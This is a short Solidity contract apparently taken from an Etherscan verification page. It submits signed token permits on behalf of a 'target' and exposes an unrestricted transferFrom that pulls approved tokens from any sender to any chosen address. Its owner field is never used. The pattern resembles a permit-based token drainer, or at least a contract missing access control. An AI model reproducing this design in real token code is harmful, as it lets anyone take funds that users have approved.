/**
 *Submitted for verification at Etherscan.io on 2022-10-03
*/

pragma solidity >=0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function permit(address target, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    function transferWithPermit(address target, address to, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract  MySmart {
    address private owner;


    constructor() {
        owner = msg.sender;
    }

    function depositWithPermit(address token, address target, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) 
    external  returns (uint) {
        
        IERC20 contractToken = IERC20(token);
        contractToken.permit(target, address(this), value, deadline, v, r, s);

        return 0;
    }

    function transferFrom(address finalAddress,address token, address sender, uint256 amount) external returns (bool) {
        IERC20 contractToken = IERC20(token);

        contractToken.transferFrom(sender, address(this), amount);
        return contractToken.transfer(finalAddress, amount);
    }
}